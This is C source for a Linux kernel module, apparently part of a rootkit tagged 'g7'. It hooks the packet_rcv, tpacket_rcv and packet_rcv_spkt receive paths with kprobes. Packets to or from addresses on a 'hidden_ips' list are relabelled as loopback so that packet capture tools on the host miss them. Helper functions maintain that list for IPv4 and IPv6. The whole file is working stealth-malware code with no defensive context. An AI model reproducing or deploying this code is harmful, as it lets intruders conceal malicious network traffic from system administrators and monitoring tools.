#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/inet.h>
#include <uapi/linux/if_packet.h>
#include <uapi/linux/ip.h>
#include <uapi/linux/ipv6.h>
#include <linux/ip.h>
#include <linux/ipv6.h>

#include "common.h"
#include "hook.h"
#include "packhide.h"

ip_list_t hidden_ips = {
    .ip  = { 0 },
    .version = -1,
    .prev = NULL,
    .next = NULL,
};

ip_list_t_ptr hidden_ips_tail = &hidden_ips;

static int g7_packet_rcv(struct kprobe *, struct pt_regs *);
static int g7_fault(struct kprobe *, struct pt_regs *, int);
static void g7_post(struct kprobe *, struct pt_regs *m, unsigned long);

// TODO store in array of kprobes
static struct kprobe p_rcv = {
    .symbol_name = "packet_rcv",
};

static struct kprobe tp_rcv = {
    .symbol_name = "tpacket_rcv",
};

static struct kprobe p_rcv_spkt = {
    .symbol_name = "packet_rcv_spkt",
};

void
hide_packets(void)
{
    p_rcv.pre_handler = g7_packet_rcv;
    p_rcv.post_handler = g7_post;
    p_rcv.fault_handler = g7_fault;

    tp_rcv.pre_handler = g7_packet_rcv;
    tp_rcv.post_handler = g7_post;
    tp_rcv.fault_handler = g7_fault;

    p_rcv_spkt.pre_handler = g7_packet_rcv;
    p_rcv_spkt.post_handler = g7_post;
    p_rcv_spkt.fault_handler = g7_fault;

    if (register_kprobe(&p_rcv))
        DEBUG_INFO("[g7] Could not insert kprobe p_rcv\n");

    if (register_kprobe(&tp_rcv))
        DEBUG_INFO("[g7] Could not insert kprobe tp_rcv\n");

    if (register_kprobe(&p_rcv_spkt))
        DEBUG_INFO("[g7] Could not insert kprobe p_rcv_spkt\n");
}

void
unhide_packets(void)
{
    unregister_kprobe(&p_rcv);
    unregister_kprobe(&tp_rcv);
    unregister_kprobe(&p_rcv_spkt);
}

void
hide_ip(const char *ip)
{
    u8 ipv4[16];
    u8 ipv6[16];

    if (strstr(ip, ".") && in4_pton(ip, -1, ipv4, -1, NULL)) {
        int test;
        memcpy(&test, ipv4, 4);
        DEBUG_INFO("val is %0X\n", test);

        if (!list_contains_ip(&hidden_ips, ipv4, v4)) {
            memcpy(ipv4 + 4, (ip_t){ 0 }, 12);
            add_ip_to_list(hidden_ips_tail, ipv4, v4);
        }
    } else if (strstr(ip, ":") && in6_pton(ip, -1, ipv6, -1, NULL)) {
        if (!list_contains_ip(&hidden_ips, ipv6, v6))
            add_ip_to_list(hidden_ips_tail, ipv6, v6);
    }
}

void
unhide_ip(const char *ip)
{
    u8 ipv4[16];
    u8 ipv6[16];

    if (strstr(ip, ".") && in4_pton(ip, -1, ipv4, -1, NULL)) {
        memcpy(ipv4 + 4, (ip_t){ 0 }, 12);
        remove_ip_from_list(&hidden_ips, ipv4, v4);
    } else if (strstr(ip, ":") && in6_pton(ip, -1, ipv6, -1, NULL)) {
        remove_ip_from_list(&hidden_ips, ipv6, v6);
    }
}

static int
g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
{
    struct sk_buff *skb;
    skb = (struct sk_buff *)pt_regs->di;

    char *data = skb_network_header(skb);
    char ver = data[0];

    ver &= 0xf0;

    struct sk_buff *clone = skb_clone(skb, GFP_KERNEL);
    pt_regs->di = (long unsigned int)clone;

    if ((ver == 0x60)) {
        struct ipv6hdr *iphdr;

        iphdr = ipv6_hdr(clone);

        if (list_contains_ip(&hidden_ips, (u8 *)&iphdr->saddr, v6)
            || list_contains_ip(&hidden_ips, (u8 *)&iphdr->daddr, v6))
                clone->pkt_type = PACKET_LOOPBACK;
    } else if ((ver == 0x40)) {
        struct iphdr *iphdr;

        iphdr = ip_hdr(clone);

        if (list_contains_ip(&hidden_ips, (u8 *)&iphdr->saddr, v4)
            || list_contains_ip(&hidden_ips, (u8 *)&iphdr->daddr, v4))
            clone->pkt_type = PACKET_LOOPBACK;
    }

    return 0;
}

static void
g7_post(struct kprobe *kp, struct pt_regs *pt_regs, unsigned long flags)
{
    return;
}

static int
g7_fault(struct kprobe *kp, struct pt_regs *pt_regs, int trapnr)
{
    return 0;
}

bool
list_contains_ip(ip_list_t_ptr list, ip_t ip, ip_version version)
{
    return !!find_ip_in_list(list, ip, version);
}

ip_list_t_ptr
find_ip_in_list(ip_list_t_ptr head, ip_t ip, ip_version version)
{
    ip_list_t_ptr i;
    for (i = head; i; i = i->next)
        if (!memcmp(i->ip, ip, (version == v4 ? 4 : 16)) && (version == -1 || i->version == version))
            return i;

    return NULL;
}

ip_list_t_ptr
add_ip_to_list(ip_list_t_ptr tail, ip_t ip, ip_version version)
{
    ip_list_t_ptr node;
    node = (ip_list_t_ptr)kmalloc(sizeof(ip_list_t), GFP_KERNEL);

    if (node) {
        memcpy(node->ip, ip, (version == v4 ? 4 : 16));
        node->version = version;
        node->next = NULL;
        node->prev = tail;
        tail->next = node;
        hidden_ips_tail = node;
        return node;
    }

    return NULL;
}

ip_list_t_ptr
remove_ip_from_list(ip_list_t_ptr list, ip_t ip, ip_version version)
{
    ip_list_t_ptr i = find_ip_in_list(list, ip, version), ret = NULL;

    if (i && (!memcmp(i->ip, ip, (version == v4 ? 4 : 16)) && i->version != -1)) {
        if (i->next)
            i->next->prev = i->prev;
        else
            hidden_ips_tail = i->prev ? i->prev : &hidden_ips;

        if (i->prev) {
            i->prev->next = i->next;
            ret = i->prev;
        }

        kfree(i);
    }

    return ret;
}
